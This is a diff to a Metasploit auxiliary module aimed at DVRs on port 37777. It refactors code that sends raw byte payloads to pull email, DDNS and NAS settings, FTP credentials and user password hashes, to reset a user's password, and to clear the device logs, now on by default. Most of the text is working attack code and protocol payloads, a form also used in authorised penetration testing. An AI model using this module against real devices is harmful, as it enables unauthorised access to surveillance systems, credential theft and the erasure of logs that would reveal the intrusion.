@@ -22,15 +22,15 @@ class Metasploit3 < Msf::Auxiliary
       OptString.new('USERNAME', [true, 'A username to reset', '888888']),
       OptString.new('PASSWORD', [false, 'A password to reset the user with, if not set a random pass will be generated.']),
       OptBool.new('VERSION_INFO', ['false', 'Grabs the version of DVR', 'FALSE']),
-      OptBool.new('EMAIL_INFO', ['false', 'Grabs the email settings of the DVR', 'TRUE']),
-      OptBool.new('DDNS_INFO', ['false', 'Grabs the DDNS settings of the DVR', 'TRUE']),
+      OptBool.new('EMAIL_INFO', ['false', 'Grabs the email settings of the DVR', 'FALSE']),
+      OptBool.new('DDNS_INFO', ['false', 'Grabs the DDNS settings of the DVR', 'FALSE']),
       OptBool.new('SN_INFO', ['false', 'Grabs the SN of the DVR', 'FALSE']),
       OptBool.new('CHANNEL_INFO', ['false', 'Grabs the cameras and their assigned name', 'FALSE']),
-      OptBool.new('NAS_INFO', ['false', 'Grabs the NAS settings of the DVR','TRUE']),
-      OptBool.new('USER_INFO', ['false', 'Grabs the Users and hashes of the DVR', 'TRUE']),
+      OptBool.new('NAS_INFO', ['false', 'Grabs the NAS settings of the DVR', 'FALSE']),
+      OptBool.new('USER_INFO', ['true', 'Grabs the Users and hashes of the DVR', 'TRUE']),
       OptBool.new('GROUP_INFO', ['false', 'Grabs the Users and groups of the DVR', 'FALSE']),
-      OptBool.new('RESET', [false, 'Reset an existing user\'s pw?', 'FALSE']),
-      OptBool.new('CLEAR_LOGS', [false, 'Clear the DVR logs when we\'re done?', 'TRUE']),
+      OptBool.new('RESET', [false, %q(Reset an existing user's pw?), 'FALSE']),
+      OptBool.new('CLEAR_LOGS', [true, %q(Clear the DVR logs when we're done?), 'TRUE']),
       Opt::RPORT(37777)
     ])
   end
@@ -38,24 +38,33 @@ class Metasploit3 < Msf::Auxiliary
   U1 = "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
   DVR_RESP = "\xb1\x00\x00\x58\x00\x00\x00\x00"
+  # Payload to grab version of the DVR
   VERSION = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  # Payload to grab Email Settings of the DVR
   EMAIL = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
           "\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  # Payload to grab DDNS Settings of the DVR
   DDNS = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
          "\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  # Payload to grab NAS Settings of the DVR
   NAS = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
         "\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  # Payload to grab the Channels that each camera is assigned to on the  DVR
   CHANNELS = "\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
              "\xa8\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  # Payload to grab the Users Groups of the DVR
   GROUPS = "\xa6\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  # Payload to grab the Users  and their hashes from the DVR
   USERS = "\xa6\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  # Payload to grab the Serial Number of the DVR
   SN = "\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+  # Payload to clear the logs of the DVR
   CLEAR_LOGS1 = "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
   CLEAR_LOGS2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
@@ -69,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
   def grab_version
     connect
     sock.put(VERSION)
-    data = sock.get(1024)
+    data = sock.get_once
     if data =~ /[\x00]{8,}([[:print:]]+)/
       ver = Regexp.last_match[1]
       print_status("Version: #{ver} @ #{rhost}:#{rport}!")
@@ -78,7 +87,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def grab_sn
     sock.put(SN)
-    data = sock.get(1024)
+    data = sock.get_once
     if data =~ /[\x00]{8,}([[:print:]]+)/
       serial = Regexp.last_match[1]
       print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
@@ -88,7 +97,7 @@ class Metasploit3 < Msf::Auxiliary
   def grab_email
     connect
     sock.put(EMAIL)
-    if data = sock.get(1024).split('&&')
+    if data = sock.get_once.split('&&')
       print_status("Email Settings: @ #{rhost}:#{rport}!")
       if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
         if mailhost = Regexp.last_match[1].split(':')
@@ -113,7 +122,7 @@ class Metasploit3 < Msf::Auxiliary
   def grab_ddns
     connect
     sock.put(DDNS)
-    if data = sock.get(1024)
+    if data = sock.get_once
       data = data.split(/&&[0-1]&&/)
       data.each_with_index do |val, index|
         if index > 0
@@ -142,7 +151,7 @@ class Metasploit3 < Msf::Auxiliary
   def grab_nas
     connect
     sock.put(NAS)
-    if data = sock.get(1024)
+    if data = sock.get_once
       print_status("Nas Settings @ #{rhost}:#{rport}!:")
       server = ''
       port = ''
@@ -152,9 +161,7 @@ class Metasploit3 < Msf::Auxiliary
         print_status("  Nas Server #{server}")
         print_status("  Nas Port: #{port}")
       end
-      if data =~ /[\x00]{16,}([[:print:]]+)[\x00]{16,}([[:print:]]+)/
-        ftpuser = Regexp.last_match[1]
-        ftppass = Regexp.last_match[2]
+      if data =~ /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/
         print_good("  FTP User: #{ftpuser}")
         print_good("  FTP Password: #{ftppass}")
         if !ftpuser.to_s.strip.length == 0 && ftppass.to_s.strip.length == 0
@@ -173,7 +180,7 @@ class Metasploit3 < Msf::Auxiliary
   def grab_channels
     connect
     sock.put(CHANNELS)
-    data = sock.get(1024).split('&&')
+    data = sock.get_once.split('&&')
     disconnect
     if data.length > 1
       print_status("Camera Channels @ #{rhost}:#{rport}!:")
@@ -185,7 +192,7 @@ class Metasploit3 < Msf::Auxiliary
     usercount = 0
     connect
     sock.put(USERS)
-    if data = sock.get(1024).split('&&')
+    if data = sock.get_once.split('&&')
       print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
       data.each do |val|
         usercount += 1
@@ -214,7 +221,7 @@ class Metasploit3 < Msf::Auxiliary
   def grab_groups
     connect
     sock.put(GROUPS)
-    if data = sock.get(1024).split('&&')
+    if data = sock.get_once.split('&&')
       print_status("User Groups: @ #{rhost}:#{rport}!")
       data.each { |val| print_status("  #{val[/(([\d]+)[:]([\w]+))/]}") }
     end
@@ -231,9 +238,9 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(u1)
     sock.put(u2)
     sock.put(u3)
-    data = sock.get(1024)
+    data = sock.get_once
     sock.put(u1)
-    if data = sock.get(1024)
+    if data = sock.get_once
       print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
     end
   end
